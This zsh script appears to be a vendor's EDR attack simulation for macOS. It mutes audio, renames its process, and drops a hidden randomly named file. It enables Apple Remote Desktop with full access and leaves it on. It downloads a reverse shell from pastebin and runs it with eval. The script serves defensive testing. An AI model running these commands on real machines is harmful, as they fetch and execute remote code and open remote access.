#!/bin/zsh

echo_with_dots() {
    local message=$1
    local max_dots=${2:-2} # Default to 2 if no argument is provided
    echo -n "$message"
    for ((i = 1; i <= max_dots; i++)); do
        sleep 1
        echo -n "."
    done
    sleep 1
    echo
}

# check if script is run as root
if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root. Try running it with sudo:"
    echo "sudo $0 $*"
    exit 1
fi

# introduction
cat <<'EOF'

.:..    ....    ..:.
====:.  .::.  .:====
:=====..:---..=====:     Welcome!
..-====------====-..
  :--------------:  
  .....------.....  
       ------       This attack simulation
       .----.      will illustrate some ways that Kandji EDR
        ....      protects against malicious behaviors.
EOF
echo_with_dots "\nInitializing EDR test script" 5

# mute the system with applescript
echo "\nMalware such as Cuckoo (Stealer:macOS/Cuckoo) has been known to mute system volume."
echo "They do this to silently take actions such as screenshots, which can produce an audible 'camera' sound."
echo_with_dots "\t[+] muting system volume" 4
osascript -e 'set volume with output muted'

# get current pid
SCRIPT_PID=$$

# change the process name using osascript
echo "\nMalware may attempt to change process names to avoid detection."
echo "(To simulate this, we'll change this shell's process name)."
echo_with_dots "\t[+] setting process name of shell to edr_test" 4
osascript -e "tell application \"System Events\" to set name of every process whose unix id is $SCRIPT_PID to \"edr_test\""

# create a randomly named hidden file in the home directory
echo "\nMalware may attempt to drop hidden files with randomized names to avoid path-based detection, and evade notice."
HIDDEN_FILE="$HOME/$(openssl rand -hex 12)"
echo_with_dots "\t[+] creating file at $HIDDEN_FILE" 4
touch $HIDDEN_FILE

# use SetFile to hide the file
echo_with_dots "\t[+] hiding $HIDDEN_FILE with SetFile command" 2
SetFile -a V $HIDDEN_FILE

# use kickstart to enable remote desktop agent
echo "\nBy enabling Apple Remote Desktop Agent, a threat actor may gain access to your machine."
echo_with_dots "\t[+] enabling Apple Remote Desktop Agent" 4
/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -restart -agent >/dev/null 2>&1

# reenable the system volume
echo "\nUnmuting system volume (we didn't forget!)"
echo_with_dots "\t[+] unmuting system volume" 3
/usr/bin/osascript -e 'set volume without output muted'

# download a reverse shell script
echo "\nMalware may fetch or drop malicious files or code."
echo "(To simulate this, we're injecting a reverse shell into the hidden file from the previous test)."
echo "This file will be detected or quarantined, depending on your Avert Library Item posture."
echo_with_dots "\t[+] downloading reverse shell script from pastebin" 6
SCRIPT=$(curl -s https://pastebin.com/raw/SCZ1f5BT)
RAND_IP="$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256))"
RAND_PORT=$((1024 + RANDOM % 64511))
# add random IP and port
SCRIPT="${SCRIPT//\$RANDOM_IP_AND_PORT/$RAND_IP:$RAND_PORT}"
# convert to unix line endings
SCRIPT=$(echo "$SCRIPT" | sed 's/\r$//')
# save file to hidden file
echo $SCRIPT > $HIDDEN_FILE


# make the hidden file executable
echo_with_dots "\t[+] applying executable file flag to $HIDDEN_FILE" 4
chmod +x $HIDDEN_FILE

# remove the first 2 lines from the script and run directly
echo "\nNow we'll execute the reverse shell."
echo "This Terminal process may be terminated, depending on your Avert Library Item posture."
REVSHELL=$(echo "$SCRIPT" | sed '1,2d')

echo_with_dots "\t[+] executing reverse shell command" 6
eval $REVSHELL